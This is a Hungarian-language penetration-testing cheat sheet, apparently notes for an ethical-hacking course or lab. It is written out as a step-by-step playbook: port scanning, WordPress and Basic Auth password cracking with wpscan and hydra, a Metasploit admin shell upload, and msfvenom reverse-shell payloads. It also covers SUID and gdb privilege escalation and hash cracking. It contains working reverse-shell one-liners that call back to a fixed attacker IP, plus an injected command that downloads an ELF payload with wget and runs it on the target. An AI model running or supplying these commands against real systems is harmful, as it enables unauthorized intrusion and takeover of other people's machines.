[Krisz githubja](https://github.com/Inckrisz/Etikus-hack/blob/main/etikushack.txt#L139)
1. Megnézzük milyen portok vannak nyitva, a {IP} placeholder helyére a célpont IP címe kell. Itt meg lehet nézni [Exploit-DB](https://www.exploit-db.com/)-n, hogy van-e olyan exploit amit ki tudunk használni, ha van msfconsoleos akkor instant root user lehetünk.
``` sh
sudo nmap -sS -sV {IP}
```
2. Ha találunk egy webszervert, akkor dirbusterrel feltérképezzük a lehetséges mappákat /valami/, ehhez a wordlist. (A megtalált mappa lesz az URI majd)
``` 
/usr/share/wordlists/dirb/common.txt
```
3. Ha megvan a weboldal a megfelelő aloldallal (pl.: login), akkor 2 lehetőség van, amennyiben Wordpresses a weboldal, úgy `wpscan`-nel feltörjük a user jelszavát. Az első parannccsal a usereket lehet megnézni a másodikkal meg a jelszavakat lehet törni. A {IP} és {URI} helyére a törendő gép IP-je és a weblap URI-je kell
```
wpscan --url http://{IP} -e u
```
```
wpscan --url http://{IP}/{URI} --passwords /usr/share/wordlists/rockyou.txt
```
4. Ha a login Basic Authos akkor pedig `hydra`-t kell használni a feltöréshez
```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt
```
5. Ha megvan a Wordpress oldalhoz a user:password páros akkor `msfconsole`-al azonnal fel lehet törni. Msfconsoleban beírjuk az alábbi parancsot majd a `set` paranccsal megadjuk az opciókat, amiket a `options` kiír és "yes" van mellette. Ezután run és fel is törtük.
```
use exploit/unix/webapp/wp_admin_shell_upload
```

6. Ha nem lehetséges, akkor `msfvenom`-mal csinálunk egy reverse shellt és belépés után feltöltjük egy php fájlba a phpmyadmin felületen (lehetőség szerint comments.php), majd megnyitunk egy kommentet, közben pedig csinálunk egy listenert a saját gépünkön.
```
nc -lvnp 4444
```
```
msfvenom -p php/reverse_php LHOST={HOST_IP} LPORT=4444 -f raw > rshell.php
```
7. Ezután felupgradelhetjük a shellünket.
```
python3 -c "import pty; pty.spawn('/bin/bash')"
```

8. Ha bent vagyunk a gépben, akkor el kell kezdeni mászni a ranglétrán. A `sudo -l`-el meg tudjuk nézni mihez van jogunk, de ehhez jelszó kell.
	Find-al keressük meg milyen SUID bitek vannak a rendszerben. Ahol + jel van ott SUID bit van. Ha ez egy futtatható fájlon van akkor a fájl nem az én jogaimmal indul hanem a SUID bites jogokkal
```
find / -perm -u=s 2>/dev/null
```
### Használható fájlok
[GTFobins](https://gtfobins.github.io/)-on meg lehet nézni van e valami
- /usr/sbin/pppd
- /usr/lib/dbus-1.0/dbus-daemon-launch-helper
- /usr/lib/openssh/ssh-keysign
- /usr/lib/xorg/Xorg.wrap
- /usr/libexec/polkit-agent-helper-1
- /usr/bin/sudo
- /usr/bin/su
- /usr/bin/fusermount3
- /usr/bin/pkexec
- /usr/bin/gpasswd
- /usr/bin/chfn
- /usr/bin/mount
- /usr/bin/chsh
- /usr/bin/umount
- /usr/bin/newgrp
- /usr/bin/ntfs-3g
- /usr/bin/passwd

 Ha van gdb
```
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

9. Megnézni, hogy a /etc/passwd írható/olvasható-e, vagy ki által lehet írni vagy olvasni `getfacl /etc/passwd` vagy van a benne hashelt jelszó (juliet:x:.. --> x helyén), ha van akkor `john`. Kimentjük egy fájlba pl jelszo. A  --format=crypt akkor kell ha y típusú
```
john jelszo --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt 
```

## SHELL Chaining PHP esetén (nem PHP-nál is működik)
``` python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.17",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
``` python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.17",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```



## Meterpreter php script
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=30.0.1.17 LPORT=4444 -f raw > rshell.php
```


## betörés exploti python
3 külön terminal majd egyiken egy Listener majd egy másikban egy reverse shell(1) és egy python webserver ott ahol a exploit db s script van(python)(2) ezután feltöltjük(3). (1 2 3 egy mappában történjen)
```
msfvenom -p linux/x64/shell_reverse_tcp LPORT=4444 LHOST=30.0.1.17 -f elf > shell.elf
```
```
python3 -m http.server
```
```
python3 50457.py  40.0.5.16 80 /phpmyadmin pma pmapass "cd /tmp; rm -rf /tmp/shell.elf; wget http://30.0.1.17:8000/shell.elf;chmod 777 /tmp/shell.elf;/tmp/shell.elf"
```
 

 ## Jelszó generálás
 ```
openssl passwd -5 alma
```
## Burpsuite
Firefox addon FoxyProxy
Proxy tab --> Intercept ON
Request küldése majd jobb klikk
Send to Repeater (jelszavak próbálgatása, manualisan)
Send to Intruder 
 Hozzáadjuk az add al, majd payload tab, megadjuk a jelszavakat és start attack, ezután nézzük a hosszakat

